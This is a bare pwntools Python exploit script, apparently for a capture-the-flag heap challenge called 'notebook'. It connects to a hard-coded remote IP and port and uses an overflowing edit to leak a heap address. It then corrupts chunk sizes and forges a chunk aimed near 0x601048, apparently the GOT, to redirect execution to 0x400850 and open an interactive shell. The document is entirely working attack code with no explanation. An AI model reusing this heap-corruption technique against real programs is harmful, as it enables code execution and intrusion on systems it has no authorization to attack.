from pwn import *
#import subprocess

def Back():
    r.recvuntil('1: Back\n2: Next\n3: Add\n4: Add BIG NOTE\n5: Edit\n6: Delete\n')
    r.send('1')
    sleep(0.2)
    
def Next():
    r.recvuntil('1: Back\n2: Next\n3: Add\n4: Add BIG NOTE\n5: Edit\n6: Delete\n')
    r.send('2')
    sleep(0.2)
    
def Add(content):
    r.recvuntil('1: Back\n2: Next\n3: Add\n4: Add BIG NOTE\n5: Edit\n6: Delete\n')
    r.send('3')
    sleep(0.2)
    r.send(content.ljust(0x3D8, '\x00'))
    
def Big(content):
    r.recvuntil('1: Back\n2: Next\n3: Add\n4: Add BIG NOTE\n5: Edit\n6: Delete\n')
    r.send('4')
    sleep(0.2)
    r.send(content.ljust(0x5DC, '\x00'))

def Edit(content):
    r.recvuntil('1: Back\n2: Next\n3: Add\n4: Add BIG NOTE\n5: Edit\n6: Delete\n')
    r.send('5')
    sleep(0.2)
    r.send(content.ljust(0x3E0, '\x00'))
    
def Delete():
    r.recvuntil('1: Back\n2: Next\n3: Add\n4: Add BIG NOTE\n5: Edit\n6: Delete\n')
    r.send('6')
    sleep(0.2)
   

#r = process(['./notebook']) 
r = remote('125.235.240.172', 1337)
Add("l")
Add("2")
Add("3")
Add("4")
Back() #3
Back() #2
Back() #1
payload = "a"*0x3e0
Edit(payload)
r.recvuntil("a"*0x3e0)
tmp = r.recvline().strip().ljust(8, '\x00')
heap = u64(tmp)
log.info("heap %#x" %heap)
payload = "a"*0x3d8+p64(0x7E1)
Edit(payload)
Next() #2
Delete() # Delete 2 -> 1
Next() #1-> 3
Delete() #Delete 3->1
Next() #1->4
payload = "\x00"*0x3d8+p64(0x3f1)+p64(0x601048-0x10)
Big(payload)
Add("5")
r.recvuntil('1: Back\n2: Next\n3: Add\n4: Add BIG NOTE\n5: Edit\n6: Delete\n')

r.send('3')
sleep(0.2)
r.send(p64(0x400850))
r.interactive()
